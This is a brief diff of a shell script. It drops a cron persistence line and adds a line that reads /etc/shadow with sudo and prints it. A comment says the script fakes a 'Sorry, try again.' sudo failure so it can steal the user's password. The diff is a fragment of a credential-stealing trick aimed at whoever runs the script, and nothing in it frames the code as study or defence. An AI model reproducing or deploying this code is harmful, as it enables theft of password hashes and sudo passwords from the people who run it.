@@ -9,9 +9,11 @@ string="touch /tmp/testerFile.txt"
 echo $string > test.sh
 chmod 777 test.sh
 
-sudo cp test.sh /etc/cron.d/test.sh
-
-
+PASSES=$(sudo cat /etc/shadow)
+# if [ $PASSES = '' ];then 
+	
+# fi
+echo "THIs"$PASSES
 # Make it look like they failed so i can steal their password
 echo "Sorry, try again."
 name=$(whoami)
